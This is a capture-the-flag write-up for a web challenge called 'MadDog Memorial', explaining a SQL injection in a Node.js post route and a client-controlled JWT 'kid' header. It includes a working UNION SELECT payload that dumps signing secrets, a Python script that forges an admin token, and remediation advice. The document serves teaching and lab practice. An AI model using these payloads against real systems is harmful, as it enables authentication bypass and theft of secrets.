# MadDog Memorial — CTF Writeup

**Event:** ADF 2026 Hackathon  
**Challenge:** MadDog Memorial  
**Category:** Web  
**Target:** `154.57.164.66:31404`  
**Flag:** `HTB{t4nn3n_fr4m3d_th3_mcFly}`

---

## Challenge Overview

A memorial website for Buford "Mad Dog" Tannen, written in Node.js with Express, Nunjucks templating, JWT-based session management, and a MySQL backend. Visitors are assigned a random `visitor_xxxxxx` username via a JWT cookie. The goal is to escalate to the `admin` user and retrieve the flag.

**Provided files:** Full Dockerized application source code with all routes, middleware, database layer, and JWT helper.

---

## How We Solved It — Reasoning

### Phase 1: Source Code Review

Reading through the source revealed two critical vulnerabilities:

**Vulnerability 1 — SQL Injection in `getPost()`** (`database.js:48`):
```javascript
let stmt = `SELECT * FROM posts WHERE id='${id}'`;
```
The `id` parameter from `/posts/:id` is interpolated directly into the SQL query string with no parameterization or sanitization. Classic SQL injection.

**Vulnerability 2 — JWT Key Store with User-Controlled `kid`** (`JWTHelper.js`):
```javascript
sign(data, kid='2') {   // visitors default to kid=2
    keyData = keyStore.filter(i => i.kid == kid)
    resolve(jwt.sign(data, keyData[0].secret, { algorithm: 'HS256', header: { kid: kid } }));
}

async verify(token, kid) {
    keyData = keyStore.filter(i => i.kid == kid)
    return resolve(jwt.verify(token, keyData[0].secret, { algorithm: 'HS256' }));
}
```
The `kid` header claim, which the attacker controls, selects which secret from the `keystore` table is used to verify the token. If we can extract the secret for `kid=1` (presumably the admin key), we can forge admin JWTs.

**Flag Retrieval Logic** (`routes/index.js:9-10`):
```javascript
if (req.data.username === 'admin')
    flag = fs.readFileSync('./flag', 'utf8');
```
The flag is read from disk and passed to the template only when the authenticated username is exactly `admin`.

### Phase 2: Exploit Chain Design

The attack chain is straightforward:
1. Use SQL injection on `/posts/:id` to extract secrets from the `keystore` table
2. Forge a JWT with `{"username":"admin"}` signed with the `kid=1` secret
3. Access `/` with the forged cookie to receive the flag

### Phase 3: Exploitation

**Step 1 — Column Enumeration**

First, we determined the `posts` table has 4 columns by testing UNION SELECT payloads. The column order is: `id`, `title`, `thumbnail`, `content`.

**Step 2 — Extract Keystore Secrets**

```bash
curl -b "session=$SESSION" \
  "http://154.57.164.66:31404/posts/0' UNION SELECT 1,GROUP_CONCAT(kid,':',secret SEPARATOR'|'),'mad1.jpg','' FROM keystore-- -"
```

Result:
```
kid=1: secret=4PZAh2OstuHASCw
kid=2: secret=8nfzqRt2IwzCEQt
```

Two keys exist: kid=1 (admin) and kid=2 (visitor). We confirmed visitors use kid=2 by signing, which matches the `sign(data, kid='2')` default.

**Step 3 — Forge Admin JWT**

Using Python's PyJWT library:
```python
import jwt
secret = '4PZAh2OstuHASCw'
headers = {'kid': '1', 'alg': 'HS256', 'typ': 'JWT'}
payload = {'username': 'admin'}
token = jwt.encode(payload, secret, algorithm='HS256', headers=headers)
```

**Step 4 — Retrieve Flag**

```bash
curl -b "session=$ADMIN_TOKEN" "http://154.57.164.66:31404/"
```

Response includes: `HTB{t4nn3n_fr4m3d_th3_mcFly}`

---

## Full PoC

```python
import jwt
import requests

TARGET = "http://154.57.164.66:31404"

# Step 1: Get a session cookie (visitor)
s = requests.Session()
r = s.get(TARGET)
visitor_token = s.cookies['session']

# Step 2: SQL injection to extract keystore secrets
r = s.get(f"{TARGET}/posts/0' UNION SELECT 1,GROUP_CONCAT(kid,':',secret SEPARATOR'|'),'mad1.jpg','' FROM keystore-- -")
# Response body contains: "kid=1: secret=4PZAh2OstuHASCw | kid=2: secret=8nfzqRt2IwzCEQt"

# Step 3: Forge admin JWT with kid=1 secret
admin_secret = '4PZAh2OstuHASCw'
admin_token = jwt.encode(
    {'username': 'admin'},
    admin_secret,
    algorithm='HS256',
    headers={'kid': '1'}
)

# Step 4: Retrieve flag with forged token
s.cookies.set('session', admin_token)
r = s.get(TARGET)
print(r.text)  # Contains: HTB{t4nn3n_fr4m3d_th3_mcFly}
```

---

## Key Insights

1. **SQL injection was not filtered or parameterized** — the `id` parameter went directly into the query string. This is the most basic and severe form of injection vulnerability.

2. **The JWT `kid` header is attacker-controlled** — the server trusts the `kid` value from the JWT header to select which key verifies the token. Combined with SQL injection leaking the admin key, this creates a complete authentication bypass.

3. **The flag gating is a simple string comparison** — `req.data.username === 'admin'`. No additional authorization checks, MFA, or IP restrictions.

4. **All visitors share the same kid=2 key** — extracting the visitor key was irrelevant; we needed the admin's kid=1 secret.

5. **No input validation on any route** — neither the JWT cookie nor the post ID parameter undergoes any validation before use.

---

## Remediation

1. **Use parameterized queries** — replace string interpolation with `?` placeholders in all SQL queries
2. **Don't trust JWT `kid` from the client** — either hardcode the signing key or use a trusted mapping server-side
3. **Add rate limiting and WAF rules** — to detect SQL injection patterns in URL parameters
4. **Implement proper authorization** — check roles/permissions, not just usernames